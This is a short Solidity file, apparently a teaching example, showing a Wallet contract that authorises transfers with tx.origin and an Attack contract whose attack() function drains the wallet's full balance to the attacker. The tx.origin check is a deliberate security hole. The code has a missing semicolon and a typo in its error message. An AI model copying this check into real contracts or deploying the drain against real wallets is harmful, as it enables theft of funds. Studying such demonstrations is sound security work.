pragma solidity ^0.6.0;

contract Wallet {
    address public owner;
    
    constructor() public {
	    owner = msg.sender;
    }

   function deposit() public payable{}
   
   function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Now Owner");	
	    _to.transfer(_amount);
    }

   function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}

contract Attack {
    address payable public owner;
    Wallet wallet;
    
    constructor(Wallet _wallet) public {
        wallet = Wallet(_wallet);
        owner = msg.sender;
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance)
    }
}
